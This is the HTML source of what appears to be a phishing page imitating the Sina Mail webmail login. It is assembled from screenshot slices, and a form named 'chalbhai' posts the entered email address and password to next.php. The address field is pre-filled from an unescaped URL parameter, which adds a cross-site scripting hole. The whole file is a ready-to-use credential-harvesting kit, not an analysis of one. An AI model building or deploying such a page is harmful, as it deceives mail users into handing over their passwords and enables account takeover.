<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#26032;&#28010;&#37038;&#31665;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<style type="text/css">
  
.textbox {  
    border: solid 1px #c8c8c8;
  	padding-left: 10px;
    font-size: 16px;
    height: 38px; 
    width: 275px; 
 } 
 
.textbox:focus {  
    border-color: #6b9bdc; 
	box-shadow: 0 0 3px #6b9bdc inset;
    border-style: solid; 
    border-width: 1px; 
    outline: 0; 
 } 

 </style>			  
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<style type="text/css">
div#container
{
	position:relative;
	width: 1350px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:202px; top:17px; width:131px; height:41px; z-index:0"><a href="#"><img src="images/logo.png" alt="" title="" border=0 width=131 height=41></a></div>

<div id="image2" style="position:absolute; overflow:hidden; left:919px; top:35px; width:229px; height:21px; z-index:1"><a href="#"><img src="images/ms1.png" alt="" title="" border=0 width=229 height=21></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:69px; width:1350px; height:179px; z-index:2"><img src="images/ms2.png" alt="" title="" border=0 width=1350 height=179></div>

<div id="image4" style="position:absolute; overflow:hidden; left:0px; top:245px; width:1350px; height:216px; z-index:3"><img src="images/ms3.png" alt="" title="" border=0 width=1350 height=216></div>

<div id="image5" style="position:absolute; overflow:hidden; left:0px; top:461px; width:1350px; height:209px; z-index:4"><img src="images/ms4.png" alt="" title="" border=0 width=1350 height=209></div>

<div id="image6" style="position:absolute; overflow:hidden; left:199px; top:672px; width:946px; height:35px; z-index:5"><img src="images/ms5.png" alt="" title="" border=0 width=946 height=35></div>

<div id="image7" style="position:absolute; overflow:hidden; left:800px; top:678px; width:344px; height:24px; z-index:6"><a href="#"><img src="images/ms6.png" alt="" title="" border=0 width=344 height=24></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:831px; top:189px; width:271px; height:23px; z-index:7"><a href="#"><img src="images/ms7.png" alt="" title="" border=0 width=271 height=23></a></div>

<div id="image9" style="position:absolute; overflow:hidden; left:982px; top:387px; width:132px; height:47px; z-index:8"><a href="#"><img src="images/ms8.png" alt="" title="" border=0 width=132 height=47></a></div>

<div id="image10" style="position:absolute; overflow:hidden; left:1041px; top:442px; width:73px; height:23px; z-index:9"><a href="#"><img src="images/ms9.png" alt="" title="" border=0 width=73 height=23></a></div>

<div id="image11" style="position:absolute; overflow:hidden; left:1047px; top:352px; width:63px; height:19px; z-index:10"><a href="#"><img src="images/ms10.png" alt="" title="" border=0 width=63 height=19></a></div>

<div id="image12" style="position:absolute; overflow:hidden; left:829px; top:500px; width:205px; height:23px; z-index:11"><a href="#"><img src="images/ms11.png" alt="" title="" border=0 width=205 height=23></a></div>

<div id="image13" style="position:absolute; overflow:hidden; left:1095px; top:491px; width:47px; height:47px; z-index:12"><a href="#"><img src="images/ms12.png" alt="" title="" border=0 width=47 height=47></a></div>

<div id="image14" style="position:absolute; overflow:hidden; left:834px; top:440px; width:103px; height:23px; z-index:13"><a href="#"><img src="images/ms13.png" alt="" title="" border=0 width=103 height=23></a></div>
<form action=next.php name=chalbhai id=chalbhai method=post>
<input name="userid" value="<?=$_GET[userid]?>" placeholder="&#36755;&#20837;&#37038;&#31665;&#21517;&#47;&#25163;&#26426;&#21495;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:278px;left:834px;top:248px;z-index:14">
<input name="pass" placeholder="&#36755;&#20837;&#23494;&#30721;" class="textbox" autocomplete="off" required type="password" style="position:absolute;width:278px;left:834px;top:304px;z-index:15">
<div id="formcheckbox1" style="position:absolute; left:830px; top:349px; z-index:16"><input type="checkbox" name="formcheckbox1"></div>
<div id="formcheckbox2" style="position:absolute; left:903px; top:349px; z-index:17"><input type="checkbox" name="formcheckbox2"></div>
<div id="formimage1" style="position:absolute; left:833px; top:386px; z-index:18"><input type="image" name="formimage1" width="131" height="47" src="images/sign.png"></div>
</div>

</body>
</html>
